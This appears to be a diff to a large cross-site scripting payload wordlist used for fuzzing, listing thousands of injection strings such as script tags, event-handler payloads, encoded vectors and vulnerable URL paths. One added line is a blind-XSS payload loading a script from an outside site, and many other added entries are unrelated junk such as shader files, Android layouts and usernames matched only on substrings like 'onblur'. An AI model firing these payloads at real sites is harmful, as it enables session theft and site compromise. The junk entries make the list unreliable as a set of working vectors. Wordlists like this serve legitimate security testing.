@@ -2690,6 +2690,7 @@ ${alert(1337)}`' autofocus
 -1<xml id="x"><a><b><script>document.cookie=true;</script>;</b></a></xml>
 -1<xml id=i><x><c><![cdata[<img src="javas]]<![cdata[cript:document.cookie=true;">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>
 -1<xml src="javascript:document.cookie=true;">
+-> payload for blind xss: <script src=rohan-website.com></script>
 -alert(1)-
 -alert(1)//\
 -alert(1)}//\
@@ -2743,6 +2744,7 @@ ${alert(1337)}`' autofocus
 /admin/queues.jsp?queuefilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68
 /api/jolokia/read<svgonload=alert(document.domain)>?mimetype=text/html
 /app/directives/ngmodelonblur.js
+/article.php?sid=\"><img
 /athcgi.exe?command=showpage&script='],[0,0]];alert('vulnerable');a=[['
 /cgi-bin/<img src="javascript:alert(cross_site_scripting.nasl);">.pl
 /cgi-bin/<script>cross_site_scripting.nasl</script>.pl
@@ -2769,6 +2771,7 @@ ${alert(1337)}`' autofocus
 /plugins/servlet/svnwebclient/statsitem.jsp?url=%3cscript%3ealert(document.domain)%3c%2fscript%3e
 /plugins/servlet/wallboard/?dashboardid=10000&dashboardid=10000&cycleperiod=alert(document.domain)
 /profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+/screens/dashboard.html#/rogueapdetail/00:00:00:00:00:00">'><img src="xxxxx">
 /scripts/<img src="javascript:alert(cross_site_scripting.nasl);">.pl
 /scripts/<script>cross_site_scripting.nasl</script>.pl
 /secure/configureportalpages!default.jspa?view=search&searchownerusername=%3cscript%3ealert(1)%3c/script%3e&search=search
@@ -9815,7 +9818,7 @@ ${alert(1337)}`' autofocus
 <iframe>
 <iframe><iframe src=javascript:confirm(4)></iframe>
 <iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>
-<iframehttp://sanpellegrinoterme.provinciabergamasca.com/robots.txt
+<iframehttp://riekibayashi-pianist.com/robots.txt
 <iframesrc="javascript:alert(2)">
 <image contenteditable onbeforeinput=alert(1)>test
 <image draggable="true" ondrag="alert(1)" style=display:block>test</image>
@@ -20453,6 +20456,7 @@ ${alert(1337)}`' autofocus
 \x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
 ]><img />//["'`-->]]>]</div>
 ^alert(1)^
+___iframe src=_ javascript_alert('xss');__.xml
 ___img onload=prompt(1)_.zip
 _mem_bin/formslogin.asp?\"><script>alert('vulnerable')</script>
 `"'><img src='#\x27 onerror=javascript:alert(1)>
@@ -20509,6 +20513,13 @@ _mem_bin/formslogin.asp?\"><script>alert('vulnerable')</script>
 `> <script>alert(5)</script>
 `><script>alert(0)</script>
 ``onerror=prompt(1)
+a-onblur.xml
+a-onfocus.xml
+a-onmousedown.xml
+a-onmousemove.xml
+a-onmouseout.xml
+a-onmouseover.xml
+a-onmouseup.xml
 a.jsp/<script>alert('vulnerable')</script>
 a.jsp/<script>alert(document.domain)</script>
 a29b1%3balert(888)//a62b7156d82
@@ -20525,6 +20536,13 @@ a=&quot;get&quot;;&amp;#10;b=&quot;url(&quot;&quot;;&amp;#10;c=&quot;javascript:
 a=<script>alert(1);/*&b=*/</script>
 a=function(){},(p=>p.c=()=>alert('d'))(a.prototype),b=new a,b.c()
 a?<script>alert('vulnerable')</script>
+a_onblur.xml
+a_onfocus.xml
+a_onmousedown.xml
+a_onmousemove.xml
+a_onmouseout.xml
+a_onmouseover.xml
+a_onmouseup.xml
 aaronmouse
 ab2/help_c/\@ab2helpsearch?scope=help&dwebquery=<script>alert(vulnerable)</script>
 abc<div style="x:\x00expression(javascript:alert(1)">def
@@ -20617,6 +20635,7 @@ accountlogin_onmousedown
 accountlogin_onmouseup
 acs/..;/admin/public/login.jsp?error=%3cscript%3ealert(document.domain)%3c/script%3e
 actionmouse
+activity_nonfocusingscrollview.xml
 add name <script>alert('vl')</script>
 add topic <iframe src=http://www.vulnerability-lab.com>
 add user <script>alert(document.cookie)</script> <script>alert(document.cookie)</script>@gmail.com
@@ -20682,6 +20701,7 @@ antispam/listdel?file=blacklist&name=b<script>alert('vulnerable')</script>&start
 antispam/listdel?file=whitelist&name=a<script>alert('vulnerable')</script>&startline=0(naturally)
 antonmouse
 antonmouse1984
+anyonmouse
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 anythinglr00</script><script>alert(document.domain)</script>uxldz
 api/jolokia/read<svg%20onload=alert(document.domain)>?mimetype=text/html
@@ -20689,6 +20709,10 @@ api/jolokia/read<svgonload=alert(document.domain)>?mimetype=text/html
 appliance/login.ns?login%5bpassword%5d=test%22%3e%3csvg/onload=alert(document.domain)%3e&login%5buse_curr%5d=1&login%5bsubmit%5d=change%20password
 apps/web/index.fcgi?servers=&section=<script>alert(document.cookie)</script>
 apps/web/vs_diag.cgi?server=<script>alert('vulnerable')</script>
+area-onblur.xml
+area-onfocus.xml
+area_onblur.xml
+area_onfocus.xml
 array.prototype[symbol.hasinstance]=eval;"alert(1)" instanceof [];
 array[symbol.species].constructor('alert(1)')();
 article.cfm?id=1'<script>alert(document.cookie);</script>
@@ -20711,6 +20735,10 @@ a{b:`function(){alert(1)}()`;}
 a{xxx:expression(if(!window.x){alert('xss');window.x=1;})}
 background-image: url(javascript:prompt(1))
 badging/badge_template_v0.php?layout=1&type="/><svg/onload="alert(document.domain)"/>
+basiccombopopup$invocationmousehandler.class
+basiccombopopup$invocationmousehandler.h
+basiccombopopup$invocationmousemotionhandler.class
+basiccombopopup$invocationmousemotionhandler.h
 basiccombopopup.invocationmousehandler
 basiccombopopup.invocationmousemotionhandler
 bb000001.pl<script>alert('vulnerable')</script>
@@ -20733,7 +20761,21 @@ bsf_rotaterightbutton_onmousedown
 bsf_slider_onmousedown
 bugs/forgot_password.php?email=\"><script>alert(document.cookie)</script>
 bugs/index.php?err=3&email=\"><script>alert(document.cookie)</script>
+button-onblur.xml
+button-onfocus.xml
+button-onmousedown.xml
+button-onmousemove.xml
+button-onmouseout.xml
+button-onmouseover.xml
+button-onmouseup.xml
+button_onblur.xml
+button_onfocus.xml
+button_onmousedown.xml
+button_onmouseup.xml
+buttonfocused.xml
 buttonmousecontrol
+buttonmousecontrol.ino
+buttonmousecontrol.txt
 c%00""<script>alert(0);</script>
 c="javascript:";
 ca000001.pl?action=showcart&hop=\"><script>alert('vulnerable')</script>&path=acatalog%2f
@@ -20742,6 +20784,17 @@ caframe_onmousewheel
 calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05
 calendar/calendar_form.php/"><script>alert(document.domain)</script>
 calendarexpress/search.php?allwords=<br><script>foo</script>&cid=0&title=1&desc=1
+cameramotionblur.cs
+cameramotionblur.cs.meta
+cameramotionblur.js
+cameramotionblur.js.meta
+cameramotionblur.shader
+cameramotionblur.shader.meta
+cameramotionblurdx11.shader
+cameramotionblurdx11.shader.meta
+cameramotionblureditor.cs
+cameramotionblureditor.cs.meta
+cameramotionblureditor.js
 canonfocus
 carbon/admin/login.jsp?loginstatus=false&errorcode=%27);alert(document.domain)//
 carbon/admin/login.jsp?msgid=%27%3balert(%27nuclei%27)%2f%2f
@@ -20832,8 +20885,10 @@ contests?*onmouseover=
 control/stream?contentid=%27\%22%3e%3csvg/onload=alert(/xss/)%3e
 control/stream?contentid=<svg/onload=alert(1)>
 controlsvisibleonload=
+cottonmouse
 creaprezzi.php?prezzoperiodo4=%22><script>javascript:alert(%27xss%27)</script>
 create_user/?username=%3cscript%3ealert(document.domain)%3c%2fscript%3e
+crimsonblur
 crowdshield xss agent"><script/src=https://crowdshield.com/.testing/useragent.js>
 cutesoft_client/cuteeditor/template.aspx?referrer=xss";><script>alert(document.domain)</script>
 cvsblame.cgi?file=<script>alert('vulnerable')</script>
@@ -20851,6 +20906,7 @@ cvsqueryform.cgi?cvsroot=/cvsroot&module=<script>alert('xss')</script>&branch=he
 d="alert('crosssitescripting');\")";
 d="alert('xss');\")";
 d=\"alert('xss');\\")\";
+damonblur
 dansguardian.pl?deniedurl=</a><script>alert('vulnerable');</script>
 dansguardian.pl?deniedurl=</a><script>alert('xss');</script>
 dashboard/snapshot/%7b%7bconstructor.constructor(%27alert(document.domain)%27)()%7d%7d?orgid=1
@@ -20883,6 +20939,7 @@ debug/errorinfo?title===<script>alert('vulnerable');</script>
 debug/showproc?proc===<script>alert('vulnerable');</script>
 delete []['__proto__']['tostring'];[]['__proto__'][symbol.tostringtag]='=alert(1)';eval([1,2,3]+'');
 delete confirm(1)
+designerregionmouseeventargs.xml
 devices-config.php?sta=%22%3e%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e
 diapo.php?rep=<script>alert(document.cookie)</script>
 dms/dlasx.kspx?shidx=<script>foo</script>
@@ -20900,6 +20957,7 @@ download.php?sortby=&dcategory=<script>alert('vulnerable')</script>
 downloads/pafiledb.php?action=download&id=4?\"&lt;script&gt;alert('vulnerable')&lt;/script&gt;\"
 downloads/pafiledb.php?action=email&id=4?\"&lt;script&gt;alert('vulnerable')&lt;/script&gt;\"
 downloads/pafiledb.php?action=rate&id=4?\"&lt;script&gt;alert('vulnerable')&lt;/script&gt;\"
+dragonmouse
 e/viewimg/index.html?url=javascript:alert(1)
 e/viewimg/index.html?url=javascript:alert(document.domain)
 echo "  -i <input file to use> parse an input file, not a burp log. input files can be created using the -p switch"
@@ -20921,15 +20979,36 @@ echo('ipt&gt;alert(\"xss\")&lt;/script&gt;'); ?&gt;
 echo('ipt>alert("crosssitescripting")</script>'); ?>
 echo('ipt>alert("xss")</script>'); ?>
 editor_tools/module?type=files/admin"><script>alert(document.domain)</script>&params=filetype=images#path=
+eent/onblur.html
+eent/onfocus.html
 element[attribute='<img src=x onerror=alert('xss');>
 email.php?forum_contact=\"><script>foo</script>
 emailfriend/emailarticle.php?id=\"<script>alert(document.cookie)</script>
 emailfriend/emailfaq.php?id=\"<script>alert(document.cookie)</script>
 emailfriend/emailnews.php?id=\"<script>alert(document.cookie)</script>
+emotionfocused
 en%0acontent-length%3a%200%0a%0ahttp%2f1.1%20200%20ok%0acontent-type%3a%20text%2fhtml%0alocation%3a%20http%3a%2f%2fcrowdshield.com%0acontent-length%3a%20122%0a%3chtml%3e%3cbody%20onload%3dalert('xss')%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e%3ciframe%20src%3d%22javascript%3aalert('xss')%3b%22%3e%3c%2fiframe%3e%3c%2fbody%3e%3c%2fhtml%3e
 en%0acontent-length%3a%200%0a%0ahttp%2f1.1%20200%20ok%0adate%3a%20fri%2c%2006%20mar%202016%2000%3a07%3a47%20gmt%0acontent-type%3a%20text%2fhtml%3bcharset%3diso-8859-1%0acontent-length%3a%2040%0a%3chtml%3e%3cbody%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e
 en%0acontent-length%3a%200%0a%0ahttp%2f1.1%20200%20ok%0adate%3a%20fri%2c%2006%20mar%202016%2000%3a07%3a47%20gmt%0alast-modified%3a%20fri%2c%2006%20mar%202017%2000%3a07%3a47%20gmt%0acontent-type%3a%20text%2fhtml%3bcharset%3diso-8859-1%0acontent-length%3a%2040%0a%3chtml%3e%3cbody%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e
 en%0d%0acontent-length%3a%200%0d%0d%0a%0ahttp%2f1.1%20200%20ok%0d%0adate%3a%20fri%2c%2006%20mar%202016%2000%3a07%3a47%20gmt%0d%0acontent-type%3a%20text%2fhtml%3bcharset%3diso-8859-1%0d%0acontent-length%3a%2040%0d%0a%3chtml%3e%3cbody%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e
+entry_content_onblur.xml
+entry_content_onfocus.xml
+entry_content_onmousedown.xml
+entry_content_onmouseout.xml
+entry_content_onmouseover.xml
+entry_content_onmouseup.xml
+entry_summary_onblur.xml
+entry_summary_onfocus.xml
+entry_summary_onmousedown.xml
+entry_summary_onmouseout.xml
+entry_summary_onmouseover.xml
+entry_summary_onmouseup.xml
+entry_title_onblur.xml
+entry_title_onfocus.xml
+entry_title_onmousedown.xml
+entry_title_onmouseout.xml
+entry_title_onmouseover.xml
+entry_title_onmouseup.xml
 environ.pl?param1=<script>alert(document.cookie)</script>
 erba/start/%3cscript%3ealert('vulnerable');%3c/script%3e
 erba/start/%3cscript%3ealert('xss');%3c/script%3e
@@ -21112,6 +21191,36 @@ feed:javascript&colon;alert(1)
 feed:javascript:alert('top page location: '+document.location+' host page cookies: '+document.cookie);//
 feed:javascript:alert('top page location: '+document.location+' host page cookies: '+document.cookie);//<br/><hr/>
 feed:javascript:alert(1)
+feed_copyright_onblur.xml
+feed_copyright_onfocus.xml
+feed_copyright_onmousedown.xml
+feed_copyright_onmouseout.xml
+feed_copyright_onmouseover.xml
+feed_copyright_onmouseup.xml
+feed_info_onblur.xml
+feed_info_onfocus.xml
+feed_info_onmousedown.xml
+feed_info_onmouseout.xml
+feed_info_onmouseover.xml
+feed_info_onmouseup.xml
+feed_subtitle_onblur.xml
+feed_subtitle_onfocus.xml
+feed_subtitle_onmousedown.xml
+feed_subtitle_onmouseout.xml
+feed_subtitle_onmouseover.xml
+feed_subtitle_onmouseup.xml
+feed_tagline_onblur.xml
+feed_tagline_onfocus.xml
+feed_tagline_onmousedown.xml
+feed_tagline_onmouseout.xml
+feed_tagline_onmouseover.xml
+feed_tagline_onmouseup.xml
+feed_title_onblur.xml
+feed_title_onfocus.xml
+feed_title_onmousedown.xml
+feed_title_onmouseout.xml
+feed_title_onmouseover.xml
+feed_title_onmouseup.xml
 ff <applet code=javascript:alert('sgl')> by @jackmasa
 ff <img src="jar:!/"> no referrer by @sneak_
 filter/jmol/iframe.php?_use=%22};alert(1337);//
@@ -21166,6 +21275,7 @@ forum_members.asp?find=%22;}alert('vulnerable');function%20x(){v%20=%22
 forums/browse.php?fid=3&tid=46&go=<script>javascript:alert('vulnerable');</script>
 forums/index.php?board=;action=login2&user=username&cookielength=120&passwrd=password<script>alert('vulnerable')</script>
 forums/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+fragment_nonfocusable_webview_in_nestedscrollview.xml
 free_time_failed.cgi?err_msg=<script>alert(document.domain);</script>
 friend.php?op=sitesent&fname=<script>alert('vulnerable')</script>
 function document::onreadystatechange(){alert(1);}
@@ -21188,6 +21298,8 @@ goform/login_process?username=test%22%3e%3csvg/onload=alert(document.domain)%3e
 googlebot/2.1 (+http://www.googlebot.com/bot.html) <iframe src="http://www.whatismyip.com/"></iframe>
 googlebot/2.1 (+http://www.googlebot.com/bot.html) <iframe src="whatismyip.com"></iframe>
 googlebot/2.1 (+http://www.googlebot.com/bot.html) <iframe></iframe>
+gpuimagemotionblurfilter.h
+gpuimagemotionblurfilter.m
 gsf_onmousedown
 gsf_onmouseup
 guest/users/forgotten?email=%22%3e%3cscript%3econfirm(document.domain)%3c/script%3e
@@ -21206,6 +21318,7 @@ header('refresh: 0;url=javascript:confirm(1)');
 help.php?chapter=<script>alert('vulnerable')</script>
 help/english/index.html?javascript:alert(document.domain)
 help/index.jsp?view=%3cscript%3ealert(document.cookie)%3c/script%3e
+holo_selector_nonfocusable.xml
 home/get_products?search=%22%3e%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e
 hopdisplayproducts.asp?id=1&cat=<script>alert(document.cookie)</script>
 housechangetypescrollbar_onmousewheel
@@ -21244,6 +21357,8 @@ http://www.<script>confirm(1)</script .com
 http://www.google<script .com>alert(document.location)</script
 http://www.google<script .com>confirm(document.location)</script
 https-admserv/bin/index?/<script>alert(document.cookie)</script>
+iconfocusedargs.xml
+iconfocusedhandler.xml
 ics?tool=search&query=%22%3e%3cscript%3ealert(document.domain)%3c/script%3e
 id=xss src=&#10<img 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 ie <!-- `<img/src=xx:xx onerror=alert(1)//--!> by @jackmasa h5sc:
@@ -21261,8 +21376,15 @@ if(1)alert(' @jackmasa ')}{ works in firebug and webkit's console
 if(1)confirm(1)}{
 ifr.onload = obj.onload;
 igen/?pg=dlasx.kspx&shidx=<script>foo</script>
+ilonmouse82
 imf_filterbutton_onmousewheel
+img-onmousedown.xml
+img-onmousemove.xml
+img-onmouseout.xml
+img-onmouseover.xml
+img-onmouseup.xml
 inc/session.php?sessionerror=0&lang= inc
+inc_dungeonblurbs.xml
 include.php?path=contact.php&contact_email=\">&lt;script&gt;alert(document.cookie);&lt;/script&gt;
 include/ckeditor/plugins/jwplayer/jwplayer/player.swf?playerready=alert(document.domain)&debug=function(){alert(document.domain)}
 includes/plupload//hostmarker:portmaker/?id=\"));}catch(e){alert(1);}//
@@ -21296,33 +21418,92 @@ inertia-clickjacking for(i=10;i>1;i--)alert(i);new activexobject("wscript.shell"
 info.php?result=",msgarray);alert(document.domain);//
 innerhtml=location.hash>#<script>alert(1)</script>
 innerhtml=location.hash>#<script>alert(1)</script>onclick=eval/**/(/ale/.source%2b/rt/.source%2b/(7)/.source);
+input-onblur.xml
+input-onfocus.xml
 input1=<script/&in%u2119ut1=>al%u0117rt('1')</script>
 input[hidden] xss <input type=hidden style=`x:expression(alert(/ @garethheyes /))`> target it.
+input_checkbox_onmousedown.xml
+input_checkbox_onmouseup.xml
+input_onblur.xml
+input_onfocus.xml
+input_type_radio_onmousedwn.xml
+input_type_radio_onmouseup.xml
+input_type_submit_onmousedn.xml
+input_type_submit_onmouseup.xml
 insert <script>alert(document.cookie)</script>
 intext:"mailinx alert (notify)" -site:networkprinters.com
 ipt:alert(0))}
 ironmouse
 ironmouse000
+ironmouse1
 ironmouse13
 ironmouse14
+ironmouse15
 ironmouse189
+ironmouse19
+ironmouse2
 ironmouse20
 ironmouse282
+ironmouse3
 ironmouse31
 ironmouse321
+ironmouse34
 ironmouse374
+ironmouse38
+ironmouse39
+ironmouse4
+ironmouse40
+ironmouse45
 ironmouse47
 ironmouse5
 ironmouse53
+ironmouse56
+ironmouse59
 ironmouse6
+ironmouse69
+ironmouse7
 ironmouse70
 ironmouse786
 ironmouse79
+ironmouse8
 ironmouse80
+ironmouse81
 ironmouse82
+ironmouse88
 ironmouse9
+ironmouse914
 ironmouse98
 isapi/testisa.dll?check1=<script>alert(document.cookie)</script>
+item_body_onblur.xml
+item_body_onfocus.xml
+item_body_onmousedown.xml
+item_body_onmouseout.xml
+item_body_onmouseover.xml
+item_body_onmouseup.xml
+item_content_encoded_onblur.xml
+item_content_encoded_onfocus.xml
+item_content_encoded_onmousedown.xml
+item_content_encoded_onmouseout.xml
+item_content_encoded_onmouseover.xml
+item_content_encoded_onmouseup.xml
+item_description_onblur.xml
+item_description_onfocus.xml
+item_description_onmousedown.xml
+item_description_onmouseout.xml
+item_description_onmouseover.xml
+item_description_onmouseup.xml
+item_fullitem_onblur.xml
+item_fullitem_onfocus.xml
+item_fullitem_onmousedown.xml
+item_fullitem_onmouseout.xml
+item_fullitem_onmouseover.xml
+item_fullitem_onmouseup.xml
+item_xhtml_body_onblur.xml
+item_xhtml_body_onfocus.xml
+item_xhtml_body_onmousedown.xml
+item_xhtml_body_onmouseout.xml
+item_xhtml_body_onmouseover.xml
+item_xhtml_body_onmouseup.xml
 iwc/idcstateerror.iwc?page=javascript%3aalert(document.domain)%2f%2f
 j&#x61;v&#x41;sc&#x52;ipt&#x3a;alert(1)
 j&newline;a&newline;vas&newline;cript:confirm(1);
@@ -21502,10 +21683,15 @@ javascript<tab>:alert(1)
 jira/secure/browseproject.jspa?id=%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
 jolokia/read<svg%20onload=alert(document.domain)>?mimetype=text/html
 jolokia/read<svgonload=alert(document.domain)>?mimetype=text/html
+jonfocus03
 jquery 1.8 a new method: $.parsehtml('<img src=xx:x onerror=alert(1)>')
 junk(223)<font%20size=50><script>alert('vulnerable')</script><!--//--
 just don't support ie <a href=[0x0b]" onclick=alert(1)//">click</a>
 kdfitemlistscrollbar_onmousewheel
+label-onblur.xml
+label-onfocus.xml
+label_onblur.xml
+label_onfocus.xml
 launch.asp?nfuse_application=<script>alert('vulnerable')</script>
 launch.jsp?nfuse_application=<script>alert('vulnerable')</script>
 ldap/cgi-bin/ldacgi.exe?action=<script>alert(\"vulnerable\")</script>
@@ -21526,8 +21712,10 @@ left:expr\0065ssion(alert('xss'))
 left:expr\65ssion(alert('xss') ))
 lemonmouse
 lemonmouse138
+lemonmouse32
 lemonmouse555
 lemonmouse624
+lemonmouse683
 lemonmouse998
 libmotionblur_plugin.dll
 libmotionblur_plugin.dll.dbg
@@ -21574,6 +21762,7 @@ mailman/options/yourlist?language=en&email=&lt;script&gt;alert('vulnerable')&lt;
 main/blank?message_error=%3cimg%20src%3dc%20onerror%3dalert(8675309)%3e
 main/blank?message_success=%3cimg%20src%3dc%20onerror%3dalert(8675309)%3e
 main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"
+material_selector_nonfocusable.xml
 megabook/admin.cgi?login=<script>alert('vulnerable')</script>
 members.asp?sf=%22;}alert('vulnerable');function%20x(){v%20=%22
 message?title=x&msg=%26%23%3csvg/onload=alert(1337)%3e%3b
@@ -21616,9 +21805,28 @@ monmouse
 moonmouse
 motionblur
 motionblur-no
+motionblur.c
+motionblur.cginc
+motionblur.cginc.meta
+motionblur.cs
+motionblur.cs.meta
 motionblur.exe
+motionblur.shader
+motionblur.shader.meta
+motionblur.xml
 motionblur.zip
 motionblur2.zip
+motionblurclear.shader
+motionblurclear.shader.meta
+motionblurcomponent.cs
+motionblurcomponent.cs.meta
+motionblurcomponent.java
+motionblurimage.xml
+motionblurjitter.png.meta
+motionblurmodel.cs
+motionblurmodel.cs.meta
+motionblurmodeleditor.cs
+motionblurmodeleditor.cs.meta
 motionblurz1
 mozilla&lt;img src=javascript:qss=7&gt;
 mozilla&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:qss=7&quot;&gt;
@@ -21655,6 +21863,7 @@ ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com
 no dos expression vector <i style=x:expression(alert(url=1))>
 no referer : <iframe src="javascript:'<script src=>;</script>'"></iframe>
 node/view/666\"><script>alert(document.domain)</script>
+nonfocus
 nosuchurl/><script>alert('vulnerable')</script>
 npctracknpclistscrollbar_onmousewheel
 npctracksearchresultlistscrollbar_onmousewheel
@@ -21666,6 +21875,8 @@ object.prototype[symbol.tostringtag]='<svg/onload=alert(1)>';while(1){}location=
 occasionfocus
 onblur
 onblur.html
+onblur_page1.xml
+onblur_page2.xml
 onclick=
 onclick=eval/**/(/ale/.source%2b/rt/.source%2b/(7)/.source);
 oncut, onblur, oncopy, ondrag, ondrop, onhelp, onload, onplay, onshow
@@ -21680,6 +21891,7 @@ onfocus-com
 onfocus.html
 onfocus=javascript:alert(123) autofocus
 onfocus=javascript:alert(9) autofocus
+onfocuschange.java
 onfocusin
 onfocusout
 onfocusti
@@ -21710,6 +21922,7 @@ onmouseover=alert(1);
 onmouseoverprompt1
 onmouseup
 onmousewheel
+onmousewheel.sqf
 onmousewheel_cardfarmescorllitem
 open`javascript:alert(1)//#${'_self'}`
 openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;
@@ -21719,6 +21932,8 @@ opera <svg><image x:href="data:image/svg-xml,%3csvg xmlns='http://www.w3.org/200
 opera bug? <img src=//\ onload=alert(1)>
 opera:<style>*{-o-link:'data:text/html,<svg/onload=alert(/@garethheyes/)>';-o-link-source:current}</style><a href=1>aaa
 optimus5buttonmouse
+option_onmousedown.xml
+option_onmouseup.xml
 options.php?optpage=<script>alert('vulnerable!')</script>
 osgmotionblur.exe
 osgmotionblurd.exe
@@ -21787,6 +22002,7 @@ phpwebsite/index.php?module=fatcat&fatcat[user]=viewcategory&fatcat_id=1%00+\"><
 phpwebsite/index.php?module=pagemaster&page_user_op=view_page&page_id=10\"><script>alert('vulnerable')</script>&mmn_position=[x:x]
 phpwebsite/index.php?module=search&sea_search_op=continue&pda_limit=10\"><script>alert('vulnerable')</script>
 pin/catego<script
+pinionfocusingmicroscope
 platform/platform-resources-en/src/tips/quickdoconmousemove.html
 pls/dadname/htp.print?cbuf=<script>alert('vulnerable')</script>
 pls/help/<script>alert('vulnerable')</script>
@@ -21805,6 +22021,7 @@ pmf_movable_frame_onmousedown
 pms.php?action=send&recipient=destinataire&subject=happy&posticon=javascript:alert('vulnerable')&mode=0&message=hello
 portmonload=1
 postnuke/html/modules.php?op=modload&name=news&file=article&sid=<script>alert('vulnerable');</script>
+precisionfocusing
 printenv.shtml?%3cscript%3ealert(%27xss%27)%3c/script%3e
 profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
@@ -21839,6 +22056,7 @@ s%22%20style=%22background:url(javascript:alert(’x’))
 s%22%20style=x:expression(alert(1))
 samples/search.dll?query=<script>alert(document.cookie)</script>
 saveonblur
+scorpionmouse
 script w/alert()
 script>">'><script>alert(string.fromcharcode(75,67,70))</script>
 script>alert('vulnerable')</script>.cfm
@@ -21861,6 +22079,10 @@ search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;
 search?query=%22%3e%3cscript%3ealert(document.domain)%3c/script%3e
 secure/configureportalpages!default.jspa?view=search&searchownerusername=%3cscript%3ealert(1)%3c/script%3e&search=search
 security/hostsignon.do?hostsignon=true&servprovcode=k3woq%22%5econfirm(document.domain)%5e%22a2pbrnzx5a9
+select-onblur.xml
+select-onfocus.xml
+select_onblur.xml
+select_onfocus.xml
 services/"%3e%3cscript%3ealert(document.domain)%3c/script%3e/services/
 servlet/contentserver?pagename=<script>alert('vulnerable')</script>
 servlet/cookieexample?cookiename=<script>alert(\"vulnerable\")</script>
@@ -21882,8 +22104,11 @@ settimeout('alert(1)',0)
 settimeout(['alert(/@garethheyes/)']); #chrome #safari #firefox
 settimeout(['confirm(4)']);
 settimeout`alert(1);//${1000}`
+setting.callback.onmousedown.html
+setting.callback.onmouseup.html
 setup.exe?<script>alert('vulnerable')</script>&page=list_users&user=p
 sgdynamo.exe?htname=<script>alert('vulnerable')</script>
+shape_showbuttonfocused.xml
 shop/normal_html.cgi?file=&lt;script&gt;alert(\"vulnerable\")&lt;/script&gt;
 shopadmin.asp?password=abc&username="><script>alert(foo)</script>
 shopping/shopdisplayproducts.asp?id=1&cat=<script>alert('test')</script>
@@ -21898,6 +22123,7 @@ siteserver/knowledge/default.asp?ctr=\"><script>alert('vulnerable')</script>
 soinfo.php?\"><script>alert('vulnerable')</script>
 solar_history.php?time_begin=xx%22%3e%3cscript%3ealert(document.domain)%3c/script%3e%3c%22&time_end=&event_level=0&event_pcs=1&search_on=on&search_off=on&word=hj%27&sort_type=0&record=10&command=%95%5c%8e%a6
 solar_slidesub.php?id=4&play=1&pow=sds%22%3e%3cscript%3ealert(document.domain)%3c/script%3e%3c%22&bgcolor=green
+solutionfocused
 spec/fixtures/pages/onmouseup.html
 sphera/login/sm_login_screen.php?error=\"><script>alert('vulnerable')</script>
 sphera/login/sm_login_screen.php?uid=\"><script>alert('vulnerable')</script>
@@ -21913,6 +22139,9 @@ ssi/printenv.shtml?%3cscript%3ealert(%27xss%27)%3c/script%3e
 start.cgi/%3cscript%3ealert('vulnerable');%3c/script%3e
 start.cgi/%3cscript%3ealert('xss');%3c/script%3e
 status%3e%3cscript%3ealert(31337)%3c%2fscript%3e
+std_inomotionblurfx.xml
+std_iwa_motionblurcompfx.xml
+std_motionblurfx.xml
 steve/services/"%3e%3cscript%3ealert(document.domain)%3c/script%3e/services/
 stop, open, print && confirm(1)
 store/agora.cgi?cart_id=<script>alert('vulnerable')</script>
@@ -21964,7 +22193,16 @@ test.php?%3cscript%3ealert('vulnerable')%3c%2fscript%3e=x
 test.shtml?%3cscript%3ealert('vulnerable')%3c%2fscript%3e=x
 test=scriptx=document.createelement(%27script%27);x.innerhtml=%27confirm(location)%27;document.body.appendchild(x);/script&notbot=uzxgjmco8aoaafuckteaaaan
 testcgi.exe?<script>alert(document.cookie)</script>
+testfocusonblur.html
+testfocusonblur.java
+tests/kwf/js/clearonfocus/seleniumtest.php
+tests/kwf/js/clearonfocus/testcontroller.php
 tests/zend/http/client/_files/testredirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)>
+textarea-onblur.xml
+textarea-onfocus.xml
+textarea_onblur.xml
+textarea_onfocus.xml
+textview_selectallonfocus.xml
 tf_onmousewheel
 the only thing i've seen work against this xss attack if you still want to allow <script> tags but not remote scripts is a state machine (and of course there are other ways to get around this if they allow <script> tags)
 theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter\"><script>alert('vulnerable')</script>,/system/status/session
@@ -22003,6 +22241,7 @@ user.php?op=confirmnewuser&module=ns-newuser&uname=%22%3e%3cimg%20src=%22javascr
 user.php?op=userinfo&uname=<script>alert('hi');</script>
 usercp.php?function=avataroptions:javascript:alert(%27vulnerable%27)
 users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+validateonblur.html
 var a = "</script> <script> alert('xss !'); </script> <script>";
 var a = &quot;&lt;/script&gt; &lt;script&gt; alert('xss !'); &lt;/script&gt; &lt;script&gt;&quot;;
 var a=0; ((a == 1) ? 2 : alert(1));//
@@ -22034,6 +22273,7 @@ viewcvs.cgi/viewcvs/?cvsroot=<script>alert('xss')</script>
 vq/demos/respond.pl?<script>alert('vulnerable')</script>
 vq/demos/respond.pl?<script>alert('xss')</script>
